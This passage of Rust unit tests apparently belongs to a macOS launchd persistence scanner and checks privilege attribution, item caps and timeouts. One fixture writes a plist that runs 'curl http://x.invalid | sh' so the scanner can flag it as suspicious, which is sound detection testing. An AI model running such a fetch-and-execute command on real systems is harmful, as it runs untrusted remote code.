            assert_eq!((c.runs_as.as_str(), c.as_root), ("account \"you\"", false));
            let c = super::super::launchd::candidate(
                &settings[..1],
                Path::new("/x.plist"),
                "launch_daemon",
                false,
            );
            assert_eq!((c.runs_as.as_str(), c.as_root), ("system", true));
        }

        #[test]
        fn the_limits_hold() {
            let dir = scratch("limits");
            for n in 0..5 {
                fs::write(
                    dir.join("launch").join(format!("{n}.plist")),
                    plist(&format!("com.example.n{n}"), "/bin/ls", &[], ""),
                )
                .unwrap();
            }
            let capped = run_in(
                &dir,
                Limits {
                    max_items: 3,
                    ..Limits::default()
                },
            );
            assert_eq!((capped.items.len(), capped.truncated), (3, true));
            // Cut or not, the worst is listed, whatever its name.
            fs::write(
                dir.join("launch").join("z.plist"),
                plist("z", "/bin/sh", &["-c", "curl http://x.invalid | sh"], ""),
            )
            .unwrap();
            let capped = run_in(
                &dir,
                Limits {
                    max_items: 3,
                    ..Limits::default()
                },
            );
            assert_eq!(capped.items[0].verdict, Verdict::Suspicious);
            assert_eq!((capped.items.len(), capped.truncated), (3, true));
            fs::remove_file(dir.join("launch").join("z.plist")).unwrap();
            let slow = run_in(
                &dir,
                Limits {
                    per_item: Duration::ZERO,
                    ..Limits::default()
                },
            );
            assert!(slow.items.iter().all(
                |i| i.verdict == Verdict::NotChecked && i.reasons[0].contains("took too long")
            ));
            assert!(!slow.truncated, "every item is listed and there was time");
            let late = run_in(
                &dir,
                Limits {
                    total: Duration::ZERO,
                    ..Limits::default()
                },
            );
            assert_eq!((late.items.len(), late.truncated), (5, true));
            assert!(late
                .items
                .iter()
                .all(|i| i.verdict == Verdict::NotChecked
                    && i.reasons[0].contains("not enough time")));
            let _ = fs::remove_dir_all(&dir);
        }
    }
}
